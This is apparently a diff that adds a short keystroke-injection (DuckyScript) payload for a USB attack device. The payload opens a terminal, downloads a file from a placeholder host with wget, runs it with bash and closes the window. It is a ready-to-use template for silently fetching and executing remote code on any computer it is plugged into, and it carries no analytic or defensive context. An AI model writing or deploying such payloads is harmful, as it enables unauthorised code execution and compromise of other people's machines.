@@ -1,0 +1,13 @@
+DELAY 200
+WINDOWS               # 
+STRING terminal       # Choose ur method depending on the os
+ENTER                 # (terminal method)
+DELAY 400
+STRING wget -O e.sh http://some.com/file
+ENTER
+DELAY 400
+STRING bash e.sh
+ENTER
+DELAY 100             # Depending on the Script
+STRING exit
+ENTER
